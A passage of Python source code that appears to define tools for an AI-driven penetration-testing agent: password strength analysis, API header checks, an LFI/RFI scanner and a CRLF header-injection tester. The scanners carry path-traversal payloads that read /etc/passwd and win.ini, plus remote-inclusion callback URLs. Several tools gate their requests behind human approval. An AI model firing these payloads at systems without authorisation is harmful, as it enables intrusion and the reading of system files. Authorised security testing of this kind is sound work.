                pass
        
        exec_logger.add_log(tool_name, "SUCCESS", "DNS enumeration complete")
        return json.dumps(dns_records, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"DNS enumeration failed: {str(e)}")
        return f"DNS enumeration error: {e}"


# ==========================================
# TOOL 6: Password Strength Checker
# ==========================================
@tool("Password Strength Analyzer")
def analyze_password_strength(password: str) -> str:
    """
    Analyzing kekuatan password based on entropy, patterns, dan common attacks.
    """
    tool_name = "Password Strength Analyzer"
    exec_logger.add_log(tool_name, "START", f"Analyzing password strength")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
    
    try:
        exec_logger.add_log(tool_name, "PROCESSING", "Calculating entropy and checking patterns")
        
        analysis = {
            "password_length": len(password),
            "character_types": {
                "uppercase": any(c.isupper() for c in password),
                "lowercase": any(c.islower() for c in password),
                "digits": any(c.isdigit() for c in password),
                "special": any(not c.isalnum() for c in password)
            },
            "entropy_bits": 0,
            "common_patterns": [],
            "strength": "Weak",
            "score": 0
        }
        
        # Calculate entropy
        char_set_size = 0
        if analysis["character_types"]["lowercase"]: char_set_size += 26
        if analysis["character_types"]["uppercase"]: char_set_size += 26
        if analysis["character_types"]["digits"]: char_set_size += 10
        if analysis["character_types"]["special"]: char_set_size += 32
        
        if char_set_size > 0:
            import math
            analysis["entropy_bits"] = len(password) * math.log2(char_set_size)
        
        # Check common patterns
        common_patterns = {
            "sequential": r"(abc|bcd|cde|012|123)",
            "repeated": r"(.)\1{2,}",
            "keyboard": r"(qwerty|asdf|zxcv)",
            "dates": r"(19|20)\d{2}"
        }
        
        for pattern_name, pattern in common_patterns.items():
            if re.search(pattern, password.lower()):
                analysis["common_patterns"].append(pattern_name)
                exec_logger.add_log(tool_name, "WARNING", f"Common pattern detected: {pattern_name}")
        
        # Score calculation
        score = 0
        if analysis["character_types"]["uppercase"]: score += 25
        if analysis["character_types"]["lowercase"]: score += 25
        if analysis["character_types"]["digits"]: score += 25
        if analysis["character_types"]["special"]: score += 25
        if len(password) >= 12: score += 10
        if len(password) >= 16: score += 10
        score = min(100, score - len(analysis["common_patterns"]) * 10)
        
        analysis["score"] = score
        if score >= 80:
            analysis["strength"] = "Very Strong"
        elif score >= 60:
            analysis["strength"] = "Strong"
        elif score >= 40:
            analysis["strength"] = "Moderate"
        elif score >= 20:
            analysis["strength"] = "Weak"
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Password strength: {analysis['strength']} ({score}/100)")
        return json.dumps(analysis, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Password analysis failed: {str(e)}")
        return f"Password analysis error: {e}"


# ==========================================
# TOOL 7: API Security Tester
# ==========================================
@tool("API Security Tester")
def test_api_security(api_url: str, method: str = "GET") -> str:
    """
    Test API endpoints for common security issues.
    """
    tool_name = "API Security Tester"
    exec_logger.add_log(tool_name, "START", f"Testing API security on {api_url}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
    
    try:
        findings = {
            "api_url": api_url,
            "authentication": "Unknown",
            "cors_enabled": False,
            "rate_limiting": False,
            "input_validation": "Unknown",
            "vulnerabilities": []
        }
        
        # Test 1: Authentication
        exec_logger.add_log(tool_name, "PROCESSING", "Checking authentication requirements")
        response = requests.request(method, api_url, timeout=5, verify=False)
        if response.status_code == 401:
            findings["authentication"] = "Required (API Key / Bearer Token)"
        elif response.status_code == 200:
            findings["authentication"] = "None (Public Access)"
            findings["vulnerabilities"].append({
                "type": "Missing Authentication",
                "severity": "Critical"
            })
            exec_logger.add_log(tool_name, "WARNING", "API is publicly accessible without authentication")
        
        # Test 2: CORS
        exec_logger.add_log(tool_name, "PROCESSING", "Checking CORS headers")
        headers_check = response.headers
        if 'Access-Control-Allow-Origin' in headers_check:
            findings["cors_enabled"] = True
            if headers_check.get('Access-Control-Allow-Origin') == '*':
                findings["vulnerabilities"].append({
                    "type": "CORS Misconfiguration",
                    "detail": "Allow-Origin: * permits any domain",
                    "severity": "High"
                })
                exec_logger.add_log(tool_name, "WARNING", "CORS is overly permissive")
        
        # Test 3: Rate Limiting
        exec_logger.add_log(tool_name, "PROCESSING", "Checking rate limiting headers")
        if 'X-RateLimit-Limit' in headers_check or 'X-Rate-Limit-Limit' in headers_check:
            findings["rate_limiting"] = True
            exec_logger.add_log(tool_name, "SUCCESS", "Rate limiting detected")
        else:
            findings["vulnerabilities"].append({
                "type": "Missing Rate Limiting",
                "severity": "Medium"
            })
            exec_logger.add_log(tool_name, "WARNING", "No rate limiting headers found")
        
        # Test 4: Security Headers
        exec_logger.add_log(tool_name, "PROCESSING", "Checking security headers")
        required_headers = ['X-Content-Type-Options', 'X-Frame-Options', 'Strict-Transport-Security']
        missing = [h for h in required_headers if h not in headers_check]
        if missing:
            findings["vulnerabilities"].append({
                "type": "Missing Security Headers",
                "headers": missing,
                "severity": "Medium"
            })
            exec_logger.add_log(tool_name, "WARNING", f"Missing headers: {missing}")
        
        exec_logger.add_log(tool_name, "SUCCESS", "API security test complete")
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"API test failed: {str(e)}")
        return f"API security test error: {e}"


# ==========================================
# TOOL 8: LFI/RFI Scanner
# ==========================================
@tool("LFI/RFI Scanner")
def scan_lfi_rfi(url: str, param: str = "file") -> str:
    """
    Scan for Local File Inclusion (LFI) dan Remote File Inclusion (RFI).
    """
    tool_name = "LFI/RFI Scanner"
    exec_logger.add_log(tool_name, "START", f"Scanning LFI/RFI on {url}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"LFI/RFI scan on {url}",
        context=f"param={param}, termasuk percobaan akses /etc/passwd dan OOB RFI test",
        risk="medium",
        exec_logger=exec_logger,
    )
    if not approved:
        exec_logger.add_log(tool_name, "BLOCKED", "Scan cancelled: approval rejected/timeout/no-context")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    try:
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        
        # OOB RFI test pakai private interactsh server
        from engines.oob_engine import oob_engine
        rfi_cid = oob_engine.generate_correlation_id("rfi")
        rfi_callback = oob_engine.generate_url("rfi")
        rfi_payloads = [
            rfi_callback,
            f"{rfi_callback}/rfi-test-shell.php",
        ]
        
        findings = {
            "lfi_vulnerabilities": [],
            "rfi_vulnerabilities": []
        }
        
        # Test LFI
        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(lfi_payloads)} LFI payloads")
        for payload in lfi_payloads:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if 'root:' in response.text or 'bin/bash' in response.text:
                    findings["lfi_vulnerabilities"].append({
                        "parameter": param,
                        "payload": payload,
                        "evidence": "File contents visible"
                    })
                    exec_logger.add_log(tool_name, "WARNING", f"LFI vulnerability found", {"payload": payload})
            except:
                pass
        
        # Test RFI (careful simulation)
        exec_logger.add_log(tool_name, "PROCESSING", f"Testing {len(rfi_payloads)} RFI patterns")
        for payload in rfi_payloads:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    findings["rfi_vulnerabilities"].append({
                        "parameter": param,
                        "payload_pattern": payload,
                        "risk": "Potential RFI - further manual testing needed"
                    })
                    exec_logger.add_log(tool_name, "WARNING", f"RFI pattern returned 200", {"payload": payload})
            except:
                pass
        
        if not findings["lfi_vulnerabilities"] and not findings["rfi_vulnerabilities"]:
            exec_logger.add_log(tool_name, "SUCCESS", "No LFI/RFI vulnerabilities detected")
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "LFI/RFI scan complete")
        
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"LFI/RFI scan failed: {str(e)}")
        return f"LFI/RFI scan error: {e}"


# ==========================================
# TOOL 9: Header Injection Tester
# ==========================================
@tool("Header Injection Tester")
def test_header_injection(url: str) -> str:
    """
    Test for Header Injection vulnerabilities (HTTP Response Splitting, CRLF Injection).
    """
    tool_name = "Header Injection Tester"
    exec_logger.add_log(tool_name, "START", f"Testing header injection on {url}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"Header injection test on {url}",
        context="Sending CRLF/null-byte payload via custom headers",
        risk="low",
        exec_logger=exec_logger,
    )
    if not approved:
        exec_logger.add_log(tool_name, "BLOCKED", "Test cancelled: approval rejected/timeout/no-context")
        return "TEST DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    try:
        injection_payloads = {
            "CRLF": "\r\nX-Injected: true",
            "CRLFx2": "\r\n\r\nInjected-Body",
            "LF": "\nX-Injected: true",
            "Null-Byte": "%00X-Injected: true"
        }
        
        findings = {
            "url": url,
            "header_injection_vulnerabilities": []
        }
        
        exec_logger.add_log(tool_name, "PROCESSING", "Testing header injection vectors")
        
        for injection_type, payload in injection_payloads.items():
            try:
                rate_limiter.wait(domain)
                # Test with custom header
                headers = {
                    "User-Agent": f"Mozilla/5.0{payload}",
                    "X-Test": payload
                }
                response = requests.get(url, headers=headers, timeout=5, verify=False)
                
                # Check jika payload ada di response headers
                if "Injected" in response.text or injection_type in response.text:
                    findings["header_injection_vulnerabilities"].append({
                        "type": injection_type,
                        "payload": payload,
                        "severity": "High"
                    })
                    exec_logger.add_log(tool_name, "WARNING", f"{injection_type} injection may be possible")
            except:
                pass
        
        if findings["header_injection_vulnerabilities"]:
            exec_logger.add_log(tool_name, "SUCCESS", f"Found {len(findings['header_injection_vulnerabilities'])} potential header injection vectors")
        else:
            exec_logger.add_log(tool_name, "SUCCESS", "No header injection vulnerabilities detected")
        
        return json.dumps(findings, indent=2)
    
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Header injection test failed: {str(e)}")
        return f"Header injection test error: {e}"


# ==========================================
# TOOL 10: Baca Log Burp Suite 
# ==========================================
@tool("Baca Log Burp Suite")
def baca_log_burp(file_path: str) -> str:
    """Reading file hasil export HTTP History from Burp Suite (format JSON)."""
    tool_name = "Baca Log Burp Suite"
    exec_logger.add_log(tool_name, "START", f"Reading Burp log from {file_path}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
    
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        
        exec_logger.add_log(tool_name, "PROCESSING", f"Parsing {len(data)} HTTP requests")
        
        hasil_parsing = []
        for item in data[:5]:  
            req_data = {
                "url": item.get("url", ""),
                "method": item.get("method", ""),
                "headers": item.get("request", {}).get("headers", ""),
                "body": item.get("request", {}).get("body", "")
            }
            hasil_parsing.append(req_data)
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Successfully parsed {len(hasil_parsing)} requests")
        return json.dumps(hasil_parsing, indent=2)
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Error baca log Burp: {e}")
        return f"Error baca log Burp: {e}"


# ==========================================
# TOOL 11: Tembak Request HTTP (ORIGINAL - UPGRADED)
# ==========================================
@tool("Tembak Request HTTP")
def tembak_payload(url: str, method: str, headers_json: str, body_data: str) -> str:
    """Sending HTTP request (payload) secara langsung ke target."""
    tool_name = "Tembak Request HTTP"
    exec_logger.add_log(tool_name, "START", f"Executing {method} request to {url}")
    if check_cancelled(exec_logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"{method.upper()} request ke {url}",
        context=f"Headers: {headers_json}\nBody: {body_data[:300]}",
        risk="high",
        exec_logger=exec_logger,
    )
    if not approved:
        exec_logger.add_log(tool_name, "BLOCKED", "Request cancelled: approval rejected/timeout/no-context")
        return "EKSEKUSI DIBATALKAN: human-in-the-loop approval rejected atau timeout. Not ada request that sent."

    try:
        headers = json.loads(headers_json) if headers_json else {}
        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

        rate_limiter.wait(_domain_of(url))
        exec_logger.add_log(tool_name, "PROCESSING", f"Sending {method} payload")
        
        if method.upper() == 'GET':
            response = requests.get(url, headers=headers, timeout=10, verify=False)
        elif method.upper() == 'POST':
            response = requests.post(url, headers=headers, data=body_data, timeout=10, verify=False)
        else:
            exec_logger.add_log(tool_name, "ERROR", f"Method {method} not supported")
            return f"Method {method} not yet didukung."
        
        exec_logger.add_log(tool_name, "SUCCESS", f"Got response: {response.status_code}")
        return f"Status Code: {response.status_code}\nResponse Body: {response.text[:1000]}"
    except Exception as e:
        exec_logger.add_log(tool_name, "ERROR", f"Request failed: {str(e)}")
        return f"Request failed: {e}"

@tool("report_new_endpoint")
def report_new_endpoint(session_id: str, new_url: str, discovered_by: str) -> str:
    """
    Used ketika agent menemukan URL, path API, atau subdomain baru 
    di tengah proses pentesting. URL this will dimasukkan ke antrean scan berikutnya.
    """
    url = new_url.strip()
    try:
        # Kirim target baru ke endpoint internal FastAPI kita (port 8000)
        res = requests.post(
            f"http://127.0.0.1:8000/api/v1/session/{session_id}/inject-target",
            json={"url": url, "source": discovered_by},
            timeout=3
        )
        if res.status_code == 200:
            return f"[SUCCESS] Target baru '{url}' success dimasukkan ke antrean pool oleh {discovered_by}."
        return f"[-] Failed mendaftarkan target, server merespon with status: {res.status_code}"
    except Exception as e:
        return f"[-] Failed menghubungi internal orchestrator: {str(e)}"


# ==========================================
# HELPER: Export Logs Function
# ==========================================
def get_execution_logs() -> Dict:
    """Return all execution logs (for API exposure)"""
    return {
        "logs": exec_logger.get_logs(),
        "summary": exec_logger.get_summary()
    }

def clear_execution_logs():
    """Clear all execution logs"""
    exec_logger.clear_logs()